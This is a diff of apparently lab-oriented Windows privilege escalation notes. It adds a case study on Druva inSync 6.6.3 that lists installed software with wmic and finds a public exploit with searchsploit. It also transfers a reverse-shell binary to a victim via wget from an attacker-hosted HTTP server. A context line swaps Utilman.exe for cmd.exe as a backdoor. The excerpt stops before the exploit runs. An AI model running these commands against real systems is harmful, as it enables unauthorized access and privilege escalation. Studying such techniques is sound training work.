@@ -292,13 +292,21 @@ copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
 > Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system.
 > Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.
 > like "C:\Program Files\" & "C:\Program Files (x86)\"  
+
+### Privilege Escalation with Case Study: Druva inSync 6.6.3 ✅
+
 ```powershell
-0️⃣ # Case Study: Druva inSync 6.6.3
 0️⃣ # Find software installed on the system
 wmic product get name,version,vendor
-1️⃣ # Cognition of vulnerability
+1️⃣ # Cognition of vulnerability and research for software existing exploits
+https://packetstorm.news/files/id/160404
+searchsploit Druva inSync 6.6.3
+searchsploit -m windows/local/49211.ps1
+2️⃣ # Transfer of malicious file to the victim system
 
 
+python3 -m http.server # attackbox
+wget http://10.11.99.141:8000/rev-svc3.exe -O C:\Users\thm-unpriv\rev-svc3.exe # target system
 
 
 ```
